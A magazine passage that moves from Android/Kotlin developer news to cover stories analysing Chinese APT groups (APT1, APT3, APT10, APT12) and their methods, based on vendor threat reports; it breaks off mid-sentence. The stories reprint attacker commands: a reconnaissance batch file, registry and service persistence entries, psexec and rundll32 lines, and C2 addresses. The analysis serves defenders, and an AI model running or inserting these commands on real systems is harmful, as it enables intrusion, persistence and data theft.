Бо лее дру желюб ный к язы ку Kotlin Android SDK
Android Pie SDK is now more Kotlin‐friendly — анонс нового Android SDK, содер‐
жащего так называемые Nullable‐аннотации для языка Kotlin. Такие аннотации
позволяют компилятору (и среде разработки) Kotlin узнать, могут ли возвра‐
щаемые объекты быть null. Важные моменты:
 1. Аннотации касаются не всех, а только наиболее используемых API.
 2. В целях совместимости компилятор будет выдавать только предупрежде‐
   ния, а не ошибки.
 3. Даже если твой проект на Java, ты все равно получишь выгоду от новов‐
   ведения: Android Studio будет предуп реждать тебя, например, о передаче
   функции параметра Null, если аргу мент помечен как не nullable.

Как включить:
 1. Установи SDK Android API 28 с помощью Tools → SDK Manager.
 2. Укажи в build.gradle: compileSdkVersion 28 .
 3. Обнови Kotlin до версии 1.2.60: Tools → Kotlin → Conﬁgure Kotlin Plugin
   Updates.


Как правильно отве чать на отзы вы в Play Store / App Store
How to Reply to iOS and Google Play Reviews Like a Pro — 13 Power Tips You
Should Always Keep In Mind — достаточно очевидная, но, возможно, полезная
подборка советов, как пра виль но отвечать на отзывы о при ложении.
 1. Отвечайте как можно быстрее.
 2. Убедитесь, что вы правильно поняли то, что сказал пользователь.
 3. Покажите свою заботу о пользователе.
 4. Отвечайте в стиле своего бренда: серьезным тоном, если это бизнес‐при‐
   ложение, или шутливо в случае игры.
 5. Не используйте шаблонные ответы.
 6. Не растекайтесь мыслью по древу.
 7. Не используйте сло ва с отрицательным оттенком: не могу, невозможно,
   никогда.
 8. Не делайте ошибок.
 9. Будьте честны, объясняйте причины и говорите о сроках.
10. Не извиняйтесь без необ ходимости.
11. Предоставьте возможность связаться с вами напрямую.
12. Подавите свой гнев.
13. Говорите спасибо.

Fun fact: 77% пользователей читают хотя бы один отзыв перед установкой
приложений, а 13% — как минимум семь.


Скры тые брил лиан ты стан дартной биб лиоте ки Kotlin
Hidden Gems In Kotlin StdLib — статья о неочевидных и неизвестных многим
возможностях стандартной библиотеки Kotlin.
 1. Класс String в Kotlin гораздо развитее сво его аналога в Java и позволяет
   делать такое:


   val blank = "   ".isBlank() // Also: CharSequence?.isNullOrBlank
   val first = "Adam.McNeilly".substringBefore('.') // "Adam"
   val last = "Adam.McNeilly".substringAfter('.') // "McNeilly"
   val withSpaces = "1".padStart(2) // "1"
   val endSpaces = "1".padEnd(3, '0') // "100"
   val dropStart = "Adam".drop(2) // "am"
   val dropEnd = "Adam".dropLast(2) // "Ad"
   "A\nB\nC".lines() // [A, B, C]
   "One.Two.Three".substringAfterLast('.') // "Three"
   "One.Two.Three".substringBeforeLast('.') // "One.Two"
   "ABCD".zipWithNext() // [(A, B), (B, C), (C, D)]
   val nullableString: String? = null
   nullableString.orEmpty() // Возвращает ""

 2. Коллекции в Kotlin тоже имеют мно жес тво удоб ных методов:


   myList.sort()
   myList.max()
   myList.min()
   myList.shuffle()
   myList.reverse()
   myList.swap(1, 2)
   myList.filter { }
   myList.filterNot { }
   myList.filterIsInstance()
   myList.filterNotNull { }
   myList.first { } // Также: indexOfFirst { }
   myList.firstOrNull { }
   myList.last { } // Также: indexOfLast { }
   myList.lastOrNull { }
   myList.single { }
   myList.singleOrNull { }
   myList.any { }
   myList.none { }
   myList.all { }
   myList.partition { } // Pair<List<T>, List<T>>

 3. Деструкция. Это уже встроенная воз можность Kotlin, о которой автор все
   равно решил упомянуть, так как пос читал важ ной. Деструкция позволяет
   заменить такой код:


   val coordinates = arrayOf(5, 10, 15)
   val x = coordinates[0]
   val y = coordinates[1]
   val z = coordinates[2]

   на такой:


   val coordinates = arrayOf(5, 10, 15)
   val (x, y, z) = coordinates

   Но что гораздо более важ но, дес трукция работает также в отношении
   data‐классов. И это позволяет тебе вер нуть из функции два значения раз‐
   ных типов:


   data class Result(val result: Int, val status: Status)
   fun function(...): Result {
       return Result(result, status)
   }
   val (result, status) = function(...)

   Деструкции можно подвергнуть также map:


   val actionsMap: Map<String, Action> = hashMapOf(...)
   for ((key, action) in actionsMap) {
       // ...
   }


Инстру мен ты
 • GradientDrawableTuner — инс трумент для быстрой генерации градиентных
   Drawable, с возможностью пос ледующего сохранения в XML‐файл;
 • Language‐Switcher‐Tile — кноп ка для меню быстрых настроек, позволя‐
  ющая быстро переключать язык устройства (пригодится для оценки
   переводов);
 • Detox — инструмент авто матизированного тестирования интерфейса при‐
   ложения.


Биб лиоте ки
 • Listn — простой музыкальный плеер, построенный на API SoundCloud;
 • CrunchyCalendar — календарь в стиле Material Design с бес конечным
   скроллингом, выбором периодов и многими дру гими функциями;
 • folding‐cell‐android — эффект складыва ющегося листа бумаги;
 • multiplatform‐settings — мультиплатфор менная биб лиоте ка для сохранения
   значений key:value, использует SharedPreferences на Android и NSUserDe‐
    faults на iOS;
 • DrawableToolbox — библиотека для создания Drawable нужных форм
   и  оттенков  на  лету,  без  необ ходимос ти  использования  файлов
   drawable.xml;
 • twinkle — добавляет эффект мерцания к элементам интерфейса;
 • HorizontalCalendarView‐Android — прокручива емый в сторону календарь;
 • Flair — фреймворк для создания комплексных приложений с разными
   архитектурами (MVC ready, MVP, MVVM, MVI);
 • Philology — библиотека, поз воляющая распространять переводы при‐
   ложения отдельно от самого приложения;
 • DroidArt — библиотека для выполнения сложных манипу ляций над текстом.
COVERSTORY
APT         ИЗ
ПОДНЕБЕСНОЙ

КИТАЙСКИЕ ХАКЕРСКИЕ
ГРУППЫ И ТЕХНИКИ ИХ
ЦЕЛЕНАПРАВЛЕННЫХ
АТАК





   Андрей Васильков
 редактор, фронемофил, гик,
          к. м. н. и т. п.
    angstroem@hotbox.ru





Следы большинс тва таргетированных атак в последние годы
приводят в азиатский регион, где ярким пятном выделяются
шанхайские серверы. В ходе расследований аналити ки
отмечают такие маркеры, как китайские IP‐адреса, времен‐
ные штампы, языковые настройки и софт, спе цифичные
для Китая. Кто же устраивает кибератаки из‐за «Великого
китайского файрвола»?


Расследование масштабных целенаправлен ных атак порой занимает годы,
поэтому подробности их про ведения становят ся известны далеко не сразу.
Обычно к моменту их пуб ликации все использованные уяз вимости закрыты
патчами, вредоносные компоненты добавлены в антивирусные базы, а C&C‐
серверы заблокированы. Однако в таких отчетах интересны методы, которые
с небольшими изменениями продолжают использовать в новых атаках.


APT1 (AKA COMMENT CREW)
Эта хакерская группа получила идентифика тор за номером один и во многом
способствовала популяриза ции термина Advanced Persistent Threat. Она уста‐
новила своеобразный рекорд по количеству данных, украденных у одной
организации: за десять месяцев APT1 выкача ла  6,5 Тбайт документов
со взломанных серверов.
   Есть много свидетель ств тому, что APT1 создана Минобороны КНР
на базе подразделения 61398 Народно‐освободительной армии Китая
(НОАК). По мнению специалис тов  FireEye, она действует с 2006 года
как отдельная структура Третьего управления Геншта ба НОАК. За это вре мя
APT1 выполнила как минимум 141 таргетированную атаку. Назвать точное
число сложно, поскольку  часть инцидентов  в сфере информационной
безопасности замалчивается, а для извес тных атак не всегда удается
доказать их принадлежность конкретной группе.





         Активность APT1 по регионам, изоб ражение: ﬁreeye.com

В соответствии с доктриной политичес кого руководства страны «побеждать
в  информационных  войнах»  APT1  была  реформирована  и  усилена
в 2016 году.





       Начало строитель ства новой базы APT1 в 2013 году, фото:
                                  DigitalGlobe

Сейчас она насчитывает в своем шта те несколько тысяч людей. В основном
состоит из выпускников Чжэцзянского университета и Харбинского политех‐
нического университета с хорошим знанием английского.
   Географически штаб‐квартира APT1 располага ется в Пудуне (новый район
Шанхая), где она владеет большим комплексом зда ний. Входы в них охра‐
няются, а на всем периметре действу ет контрольно‐пропус кной режим,
как на военной базе.





               КПП на базе APT1, фото: city8.com

Чтобы ускорить активную фазу атаки и замести следы, APT1 использовала
«аэродромы подскока» — зараженные компьютеры, управля емые через RDP,
и FTP‐серверы, на которых раз мещалась боевая нагрузка. Все они геог‐
рафически располагались в том же регионе, где находились цели.
  За  двухлетний  период  наблюдений  специалис ты  FireEye обнаружи‐
ли 1905 случаев исполь зования таких промежу точных узлов с 832 разных IP‐
адресов, причем 817 из них вели в шанхайские сети China Unicom и China
Telecom, а регистрационные записи Whois пря мо указывали на Пудун, где,
кроме штаб‐квар тиры APT1, нет орга низаций сравнимого масштаба.
   Управляли этими про межу точными узлами обычно при помощи прокси
HTRAN (HUC Packet Transmit Tool) с 937 раз ных серверов, контролируемых
APT1.
  В своих атаках APT1 использовала 42 бэкдора из разных семейств. Часть
из них была написана давно, рас пространялась в даркнете или модифициро‐
валась на заказ (Poison  Ivy, Gh0st RAT и дру гие), но среди этого набора
выделяется Backdoor.Wualess и его более поз дние модификации. Похоже,
это собственная разработка APT1.
   Как и в других таргетированных атаках, в сценари ях APT1 боевая нагрузка
доставлялась на компьютеры жертв метода ми социального инжиниринга (в
частности, spear phishing). Основная функциональность бэкдора Wualess
содержалась   в  библиотеке  wuauclt.dll,   которую   троян‐дроппер
из зараженного письма помещал на целевых компьютерах под управлением
Windows в системный каталог (%SYSTEMROOT%\wuauclt.dll).
  Затем бэкдор выполнял проверку на предшес твующее заражение и при
необходимости прописывал себя в реестре как сервис:


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv "Start"
 = "2"
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv\Parame
ters "ServiceDll" = "%SystemRoot%\wuauclt.dll"

Далее бэкдор соединялся с одним из управляющих серверов через IRC:
 • NameLess.3322.org, TCP‐порт 5202;
 • sb.hugesoft.org, TCP‐порт 443.

Последний порт по умолчанию используется браузерами для соединения
по HTTPS, поэтому обычно он не блокиру ется файрволами.
  Получив коман ду, бэкдор выполнял одно из следующих действий:
 • проверял скорость подклю чения;
 • собирал и отправлял данные о системе и пользователях;
 • делал скриншот и отсылал его;
 • очищал DNS‐кеш и подменял записи в нем;
 • скачивал и запускал на выполнение очередной зловред;
 • завершал указанные процессы в памяти;
 • искал и отправлял файлы, соот ветс твующие указанным критериям  (в
   основном документы офис ных форматов и архивы);
 • обновлял свою версию;
 • сохранял свою копию в точке вос становления (System Volume Information).

Последняя особенность затрудняла полное удаление бэкдора, поскольку ОС
обычно блокировала доступ к катало гу \System Volume Information\.
  Более поздние модификации (например, Wualess.D) использовали случай‐
ные имена файлов, боль шой набор номеров портов для соединения с C&C‐
серверами и запускались как скрытая копия про цес са iexplore.exe.
  Другой характерной чертой APT1 ста ло исполь зование WEBC2‐бэкдоров.
Они обладают минимальным набором функций (в основном используются
для сбора сведений) и соединяются с управляющими серверами по типу бра‐
узера. Бэкдор получает от сервера веб‐стра ницу, в тегах которой содержатся
управляющие команды. Такой тра фик выглядит как сетевая активность поль‐
зователя и обычно не вызывает подозрений у поведенческих анализаторов
защитных систем.
  Среди прочих техник обфуска ции тра фика, используемых APT1, выделя‐
ются способы соединения с C&C‐серверами у бэкдоров MaCroMaIL (ими‐
тирует работу MSN Messenger), GLooxMaIL (имитиру ет клиент Jabber/XMPP)
и CaLenDar (его обмен данными похож на син хро низацию гугловского кален‐
даря).
  Для сбора сведений о зараженных компь ютерах APT1 использовала
встроенные средства Windows, которые вызывались через батник (.bat), соз‐
даваемый бэкдором по команде. Напомню, что знак > указывает на перенап‐
равление вывода в файл вместо отображения на экране, а расширение фай‐
ла с логом не имеет значения, так как внут ри это формат plain‐text в кодиров‐
ке ASCII/DOS.


@echo off // Отключение вывода команд
ipconfig /all > %TEMP%\ipconfig.log // Сохраняет полные сведения о
настройке протокола IP, список всех сетевых адаптеров и их
MAC‐адресов
netstat ‐ano > %TEMP%\netstat.log // Отображает все сетевые
подключения и открытые порты, указывает идентификатор каждого
процесса и сетевые адреса в числовом формате
net start > %TEMP%\services.log // Перечисляет все запущенные службы
Windows
tasklist /v > %TEMP%\tasks.lst // Генерирует список всех запущенных
процессов и потребляемых ими вычислительных ресурсов
net user > %TEMP%\users.lst // Сохраняет список учетных записей
Windows из локальной БД
net localgroup administrators > %TEMP%\admins.lst // Выводит
перечень учетных записей, входящих в локальную группу
«Администраторы»
net use > %TEMP%\shares.net // Отображает список подключений к общим
сетевым ресурсам
net view > %TEMP%\hosts.dmn // Показывает список хостов в текущем
домене или сети

Также при помощи соот ветс твующих команд вида net group <cmd> сохраня‐
ется перечень администра торов домена, контрол леров домена, серверов MS
Exchange и другая информа ция о корпоративной сети.
  Именно благодаря его примитивности данный способ сбора информации
работал безотказно. Встроенные средс тва диагностики есть на любом
компьютере с любой версией Windows. Переменная %TEMP% избавляет
от необходимости искать папку для сохранения логов. В каталог для вре мен‐
ных файлов может писать любой пользователь (и запущенный с его правами
бэкдор). На файлы текстового формата (тем более — логи стандартного
вида) не ругается ни один антивирус, да и для пользовате ля они выглядят
совершенно безобидно — примерно как сбор телеметрии от Microsoft
или рутинные проверки админа.
   Единственное отличие заключалось в том, что собранные логи затем упа‐
ковывались в архив .rar и отправлялись на серверы APT1 для выбора даль‐
нейших целей. Что бы усложнить ана лиз утечки данных, содержащий логи
архив .rar создавался с клю чом ‐hp (ука зывает на необходимость шиф ровать
не только содержимое, но и сами имена файлов).
  После сбора  отчетов о системе начинал ся следующий  этап  атаки
для получения поль зовательских паролей. В основном на этом шаге также
использовались обще доступные утилиты, которые бэкдор запускал по коман‐
де C&C‐сервера:
 • программа сбора NTLM‐хешей паролей в Windows fgdump;
 • дампер пароль ных хешей pwdump7;
 • mimikatz;
 • gsecdump и другие утилиты от TrueSec;
 • pass‐the‐hash toolkit и дру гие инс трументы от Core Security.

Все они распознаются как not‐a‐virus или hacktool и не вызывают сра‐
батывания антивирусов при соответству ющих настройках (игнорировать ути‐
литы для аудита паролей).
  Подобрав пару хеш — пароль (чаще всего — прос тейшими атаками
по словарю), в APT1 получали возможность уда ленно выпол нять любые дей‐
ствия от имени реального сотрудника компании. В том числе отправлять с его
адреса и через его аккаунт в корпоративной сети (а также через его учетку
VPN) новые фишинговые письма для ата ки на компь ютеры руководства и пар‐
тнерских организаций. Имен но они и хра нящиеся на них данные становились
конечной целью. В общей сложности APT1 ответственна за похищение
информации о высоко технологичес ких разработках более чем у ста крупных
международных компаний и свя занных с ними университетов. Многие цели
были успешно атакованы несколько раз.


APT3 (UPS TEAM)
Предположительно свя зана с MSS — Министерством государственной
безопасности КНР. Действу ет через Центр оценки информационных тех‐
нологий Китая (CNITSEC) и Центр безопас ности ITSEC в Гуандуне.
  Именно в деловой центр Гуандуна — Huapu Square West Tower ведут следы
сразу нескольких крупных таргетиро ванных атак. В нем находится штаб‐квар‐
тира компании Boyusec, которая наряду с Huawei и ZTE сотрудничает
с Shanghai Adups Technology — ключевым партнером CNITSEC.





  Huapu Square West Tower — предположительно одна из баз APT3, фото:
  DigitalGlobe

Так или иначе, APT3 — самая техничес ки продвинутая группа. Использует
в атаках 0day‐уязвимости, кас томные бэкдоры, постоянно меняет набор
используемых C&C‐серверов, инструментов и методов. Ее подходы хорошо
иллюстрируют три крупные таргетиро ванные ата ки, подробнее о которых
будет рассказано ниже.


Опе рация «Под польная лиса»
APT под названием Operation Clandestine Fox началась весной 2014 года. Она
затронула IE с шестой по один надца тую вер сии, что согласно NetMarketShare
суммарно составляло около трети всех бра узеров на тот момент.
  В Clandestine Fox использовалась уяз вимость CVE‐2014‐1776, при водящая
к атаке Use‐after‐free с использовани ем кучи.
  Динамическая память, или куча  (heap), устроена  так, что пос тоянно
перезаписывается крупными бло ками. Обычно на запрос сле дующего сво‐
бодного блока менеджер кучи выдает адрес того, который только что был
освобожден каким‐либо объектом (особенно если он такого же размера).
   Суть атаки Use‐after‐free сос тоит в том, что пос ле освобождения объ ектом
памяти на адрес его блока еще какое‐то время ссы лается указатель ptr
при вызове методов данного объекта. Если сперва запросить выделение
динамической памяти, а затем попытать ся выз вать метод только что осво‐
бодившегося объекта, то менеджер кучи с боль шой вероятностью вернет нам
старый адрес. Если в таблицу вир туаль ных методов (VMT, Virtual Method Table)
поместить указатель на вредонос ный код, а саму VMT записать в начало
нового блока памяти, то зловред запус тится при вызове метода хранив‐
шегося там ранее объекта.
  Предотвратить такой сценарий ата ки призван механизм рандомизирован‐
ного выделе ния памяти — ASLR. Однако при операции Clandestine Fox
использовались простые методы его обхода.
  Самый простой из них — задействовать модули, не поддерживающие
ASLR. Например, старые библиотеки MSVCR71.DLL и HXDS.DLL, которые
скомпилированы без новой опции /DYNAMICBASE. Они загружаются по одним
и тем же адресам в памяти и на момент атаки присутствовали на большинс‐
тве компьютеров. MSVCR71.DLL загружается IE в Windows 7 (в час тности,
при попытке открыть стра ницу помощи, начинающуюся с ms‐help://),
а HXDS.DLL — при запуске приложений MS Oﬃce 2007 и 2010.
  Дополнительно в Clandestine Fox использовалась техника, позволя ющая
обойти систему предотвращения выпол нения данных (DEP), подробности
о ней стали известны толь ко при ана лизе следующей атаки группы APT3.


Опе рация «Под польный волк»
Фишинговая кампания Clandestine Wolf ста ла про должением «под польной
лисы» и проводилась APT3 в 2015 году. Она ста ла одной из самых эффектив‐
ных, поскольку в ней использовалась ошиб ка переполнения буфера в Adobe
Flash Player, для которой тогда не было патча. Уяз вимость CVE‐2015‐3113 зат‐
рагивала все актуальные на тот момент вер сии плеера для Windows, OS X
и Linux. Она позволяла выполнить про извольный код почти без взаимодей‐
ствия с пользователем и в обход защитных систем.
  В почтовой рассылке APT3 заманивала предложением купить восстанов‐
ленные iMac по льготной цене. Ссылка в пись ме вела на веб‐страницу,
содержащую ﬂv‐файл и запускающую экс плоит. Инте ресно, что экс плоит
обходил встроенную защиту DEP (Data Execution Prevention), перехватывая
управление стеком (call stack) и выполняя ата ку методом возвратно ориенти‐
рованного программирова ния — ROP. При этой ата ке вызывалась функция
VirtualAlloc из Kernel32.dll и создавались ука затели на внедренный шелл‐код,
а сам он помечался как исполняемый.
   Также эксплоит преодолевал второй слой защиты, эксплуатируя извес‐
тные недостатки рандомиза ции адресно го прос транства (ASLR) и внедряя
исполняемый код в другие процессы (в основном в поток браузе ра).
   Чтобы скрыть ROP‐ата ку, экспло ит на веб‐странице был зашиф рован
(RC4), а ключ для его дешифровки извлекал ся скриптом из соседней кар‐
тинки. Поэтому антивирусная проверка зараженной веб‐страницы тоже
не обнаруживала ничего подозрительного.
  В результате поль зователю достаточно было кликнуть по ссылке, чтобы
на его компьютер установился бэкдор. Ни встроенные методы защиты в ОС
и браузере, ни отдельные антивирусы не мог ли защитить от 0day‐экс плоита.


Опе рация «Двойное нажатие»
Фишинговая кампания Double Tap проводилась осенью 2014 года с исполь‐
зованием двух све жих уязвимос тей:
 • CVE‐2014‐6332;
 • CVE‐2014‐4113.

Первая уязвимость позволяет изменять раз меры массива, задаваемые движ‐
ком VBScript, из‐за ошибки в работе функции SafeArrayRedim библиотеки
OleAut32.dll. Вторая связана с системным драйвером win32k.sys и при‐
водит к повышению привилегий на уровне ядра Windows.
   Эксплоиты  запускались  при помощи  элемента  iframe,  внедряемого
на страницы взломанных сайтов и HTML‐писем. В качестве наживки на этот
раз было выбрано предложение о бесплатной подписке на месяц в клубе
Playboy, дающей неограниченный дос туп к фотографиям в высоком раз‐
решении и Full HD клипам. Ссылка вела на фейковый домен playboysplus.com.
  После клика по ней на компьютер загружался файл install.exe раз‐
мером 46 Кбайт. Это троян‐дроппер, который не содержит вредоносных фун‐
кций и на момент начала ата ки не детектировался антивирусами ни по сиг‐
натурному, ни по эвристическому ана лизу. Он создавал два файла: doc.exe
и test.exe в общем поль зователь ском каталоге C:\Users\Public\. Этот
жестко заданный путь отсутс твовал на некото рых компьютерах, что уберегло
их от заражения. Достаточно было использовать вместо него переменную
(например, %USERPROFILE% или %TEMP%), что бы столь сложная атака не заг‐
лохла в самом начале из‐за недора зумения с абсолют ными путями.
  Файл doc.exe поддерживал 64‐битную архитектуру и содержал эксплоит
уязвимости CVE‐2014‐4113. Он был нужен для того, чтобы попытаться запус‐
тить бэкдор test.exe с правами системы. Проверка успешного запуска выпол‐
нялась консольной командой whoami.
  В свою очередь, test.exe содержал код для экс плу атации уяз вимос ти CVE‐
2014‐6332, который был модификацией другого популярного эксплоита, вхо‐
дящего в состав Metasploit.
  В случае успеха бэкдор уста навливал SOCKS5‐прокси и отправлял корот‐
кий запрос (05 01 00) на командный сервер первого уровня по адре‐
су 192.157.198.103, TCP‐порт 1913. Если он отвечал 05 00, бэкдор соединял‐
ся с командным сервером второго уровня по адресу 192.184.60.229, TCP‐
порт 81. Затем он слушал его трехбайтовые команды и выпол нял их.
  В ходе развития атаки бэкдор получил апгрейд, а позже антивирусы стали
детектировать его как Backdoor.APT.CookieCutter, aka Pirpi.
   Чтобы снизить вероятность обнаружения, он загружался по адре су %USER‐
PROFILE%/Application Data/ в виде файла mt.dat (час то *.dat исключают‐
ся из антивирусной проверки ради ее ускорения) и запускался отдельным
командным файлом:


@echo off
cmd.exe /C start rundll32.exe "%USERPROFILE%\Application Data\mt.dat"
 UpdvaMt

Rundll32 — служебная консольная программа, поз воляющая вызывать явно
заданные функции, экспортируемые из динамических библиотек (DLL). Изна‐
чально она создавалась для внутреннего использования в Microsoft, но затем
вошла в состав Windows (начиная с 95). Если дру гими средствами можно
обратиться   к  библиотеке  только  с  корректным  расширени ем,  то
Rundll32 игнорирует расширения файлов.


ВЫВОДЫ
Судя по всплывающим фактам, в области кибербезопасности на правитель‐
ство Китая работают круп ные команды профес сиональных хакеров. Часть
из них официально считаются армейскими подразделениями — им оформля‐
ют допуск к государственной тайне и охра няют наравне со штаб ными связис‐
тами. Другие действуют через коммерчес кие фирмы и выполняют атаки пря‐
мо из делового центра. Третьи — вольнона емные группы, которые часто сме‐
няются. Похоже, что пос ледним поруча ют самые гряз ные дела, после чего
некоторых сдают правоохранительным органам, чтобы обе лить репутацию
правящей партии. В случае прокола их прос то назначают виноватыми
и нанимают следующих.
COVERSTORY
  ШПИОНАЖ
     ИЗ-ЗА ВЕЛИКОЙ СТЕНЫ

                КАК ДЕЙСТВУЮТ КОМАНДЫ
                    КИТАЙСКИХ ХАКЕРОВ





                                                                 Андрей Васильков
                                                                              редактор, фронемофил, гик,
                                                                                                             к. м. н. и т. п.
                                                                                angstroem@hotbox.ru





В Китае для кибершпиона жа, помимо регулярных структур
на базе подразделений НОАК и Министерства госбезопас‐
ности, исполь зуются и вольнонаемные команды хакеров. Им
поручают самую грязную работу, что бы в случае разоб‐
лачения репутацион ный ущерб правительству был минима‐
лен. В этой статье мы разберем их инструменты и методы.


           WARNING

                      Вся информация в этой статье предоставлена
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный дан ными материала ми.



APT10
Хакерская группа APT10 (aka Menupass, aka Red Apollo, aka Stone Panda, aka
CVNX) регулярно попадает на радары ана литиков с 2009 года. Она ориенти‐
рована в первую оче редь на строитель ные, инженерные, аэрокосмические
и телекоммуникационные компании, а также правительственные организации
в США, Европе и Японии. Выбор этих отраслей соответству ет целям наци‐
ональной безопасности Китая. По данным FireEye, за счет кибершпионажа
APT10 китайское правительство получило дос туп к военным разработкам,
агентурным данным и другой ценной информа ции. Эта же группа ответствен‐
на за кражу сведений, сос тавляющих коммерчес кую тайну и обеспечивающих
конкурентное преимущес тво  китайских корпораций  (особенно в сфе ре
телекома) на международном рын ке.
  Долгое время считалось, что после серии атак группа APT10 ушла со сце‐
ны, однако в 2016 году она снова привлекла вни мание специалистов
по информационной безопасности. В 2016–2017 годах APT10 провела мас‐
сированные фишинговые кампании, затронувшие все шесть континентов (да,
она задела даже поляр ные станции Антарктиды).


ОПЕРАЦИЯ «ОБЛАЧНЫЙ БУНКЕР»
Современные тенденции оптимиза ции биз неса соз дают новые векторы атак.
К примеру, сейчас крайне популярны ИТ‐услуги на аутсорсинге и облачные
сервисы. APT10 и другие хакерские группы начинают использовать их
в качестве отправной точки для проникновения на компьютеры жертв.
   Стратегия APT10 вклю чает в себя не только классичес кий spear phishing,
но и проведение атак через пос тавщиков услуг. В основном APT10 исполь‐
зует для это го утилиту удаленного администрирова ния PlugX. Она инте ресна
тем, что устанавливает связь со своим C&C, используя зараженные серверы
провайдеров ИТ‐сервисов. PlugX закрепляется в системе, тестирует подклю‐
чение и в случае успеха настраивает прокси через серверы доверенных пос‐
тавщиков услуг, маскируясь под Corel Tools и дру гие популярные утилиты.


sc create CorWrTool binPath="\"C:\Windows\vss\vixDiskMountServer.exe\
"" start=auto displayname="Corel Writing Tools Utility" type=own
sc description CorWrTool "Corel Graphics Corporation Applications."
ping ‐a [target]
psexec.exe <orghost> d.exe
net view /domain:[domain]
proxyconnect ‐ "port": 3389, "server": "[IP]"

Таким способом удается избежать срабатывания IDS и блокировки файрво‐
лом, поскольку трафик к облачному серверу провайдера выглядит для них
безобидно.
  Использование ИТ‐инфраструктуры управляемых услуг (Managed services
providers, MSP) в качестве плацдарма для проведения APT стало особенно
популярной схемой за пос ледние два года. Специалисты подразделения Ap‐
plied Intelligence компании BAE Systems расследуют их совмес тно с аудитора‐
ми PricewaterhouseCoopers. Упро щен ная схема выглядит так.





           APT10 и атака через MSP. Изоб ражение: BAE/PwC

По данным BAE, за 2016–2017 годы арсенал APT10 сущес твенно расширил‐
ся. В нем появились тро ян Scorpion и бэкдор SNUGRIDE — два компонента,
необходимые для ускорения пер вого этапа ата ки и превращения ее в тар‐
гетированную.
   Троян «Скорпион» впервые был замечен в 2016 году во время мас‐
сированной атаки на японские организации. Он про водит профилирование
жертвы, собирая имя компь ютера, идентификаторы запущенных процессов,
путь к переменной %TEMP% и версию Internet Explorer. Затем передает закоди‐
рованную системную информацию на один из жестко прописанных адре сов
сервера управле ния (C&C), используя стро ку User‐Agent. Также он может заг‐
ружать и запускать на исполнение дополнительные вредонос ные модули,
подготавливая следующий шаг ата ки.
  Основная  задача  бэкдора SNUGRIDE —  дропнуть  обратный шелл
для обхода NAT и файрволов. В случае успеха он связывается с командным
сервером по HTTP, но все запросы отсылает зашифрованными AES. Ключ
статический и хранится локально, поэтому единс твенная цель шиф рования —
сбить с толку IDS и прочие системы анализа трафика.
  После выбора целей хакеры управляли зараженными компьютерами через
другие бэкдоры — RedLeaves и QuasarRAT. Оба компонента были созданы
APT10 на основе открытых проектов. Первый — доработанная напильником
версия Trochilus, а последний — также модифицированная в APT10 «кры са»,
доступная с открытым исходным кодом на GitHub. Конфигурационный файл
RedLeaves «зашифрован» — XOR с ключом 0x53. Обмен с командным сер‐
вером у него тоже «шифруется» — по RC4 с клю чом 88888888. Обычно
RedLeaves загружается через зараженную .DLL, поль зуясь тем, что при запус‐
ке любой программы поиск нужных ей динамичес ких библиотек начинается
в том же каталоге. Он просто подменяет собой ieproxy.dll в каталоге IE
или какую‐то другую DLL’ку из набора стандартных.
  В зависимости от наличия на зараженном компьютере других компонен‐
тов APT10 RedLeaves дополняет или заменя ет их функциональность. Он также
может собрать первичную информацию о жертве, установить обратный шелл,
найти, переслать или удалить определен ные файлы, сде лать и отправить
скриншоты, скачать и запустить дру гие зловреды по команде C&C.
  Интересно, что для выполнения ата ки через пос тавщиков услуг не исполь‐
зовались какие‐то продвинутые методики. Все огра ничивалось примитивным,
но действенным набором старых трюков — подсунуть сотрудникам облачного
провайдера файлы с двойным рас ширением (.doc.exe) или прислать ярлыки
на зараженные файлы под видом документов в архиве.
   Здесь наблюдается парадоксальная ситуация: чем больше компании
инвестируют в ИБ, тем халатнее ста новятся их сотрудники. Они полагаются
на дорогие средства защиты, считая, что продвинутые программно‐аппарат‐
ные комплексы как‐то сами собой, полностью автоматически отразят все ата‐
ки. Однако, как говорил Марк Раш из Computer Sciences: «Не существу ет
устройства, которое запретит людям вес ти себя по‐идиотски».
  После совместных действий BAE, PwC и FireEye активность APT10 сущес‐
твенно снизилась. Однако ана литики сходят ся во мнении, что это лишь оче‐
редное затишье перед бурей.


APT12
Предположительно APT12 (aka IXESHE, aka DynCalc, aka Calc Team, aka
DNSCALC, aka Numbered Panda) — это группа фрилансеров, нанятая НОАК
для проведения отдельных операций. Также действу ет с 2009 года и обычно
рассылает фишин говые письма с нас тоящих почтовых аккаунтов после их
взлома. Преимущественно атакует СМИ и технологические компании в Япо‐
нии и на Тайване.
  Основной инструмент APT12 — бэкдор Etumbot. Он состоит из двух ком‐
понентов: дроппера и пейлоада в формате 7z‐SFX с парольной защитой
для преодоления антивиру сов. Чаще всего жертвы загружали его по ссылке
в PDF из фишингового пись ма, где содержались даль нейшие инс трукции.
  Сначала  пользователь  попадал  на  скомпрометированный  веб‐сайт,
в HTML‐код которо го хакеры из APT12 внедрили элементы <iframe>,
перенаправляющие браузер на зараженную страницу. Скрипт на этой стра‐
нице анализировал компьютер жертвы на пригодность к дальнейшей атаке.
В частности, он проверял версию MS Oﬃce. Если она была в списке уяз‐
вимых, то генерировалась ссылка на троян‐дроп пер.





     Определение версии MS Oﬃce для выбора дальнейших целей

Чтобы сбить с тол ку пользователя, он ска чивался под видом документа
или скринсейвера, имя которо го отображалось задом наперед. Этот трюк
известен как Unicode Right to Left Override (RTLO) и заключается в том, что
после управляющего символа U+202E все пос леду ющие отображаются спра‐
ва налево.
  После запуска он создавал следующие файлы:


%Application Data%\Locations\conime.exe
%User Temp%\~DS5D64.doc

и помещал свои копии во временный каталог текущего пользователя:


%User Temp%\wmspd.dll
%User Temp%\wuauclt.exe

Затем он прописывал себя на автозапуск, мас кируя свой вызов под загрузку
conime.exe (штатной утилиты управления вводом с клавиатуры в консоли)


HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\
Explorer\Run
conime="%User Temp%\wuauclt.exe"

и  создавал  каталог  %Application  Data%\Locations,  куда  копировал
основные файлы бэкдора.
  Собственно бэкдор прописывает себя на автозапуск под видом ком‐
понента Java.


[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"JavaSvc"="C:\\Documents and Settings\\User\\Application Data\\JAVA\\
JavaSvc.exe"

При первом запуске он отсылает командному серверу запрос GET вида [
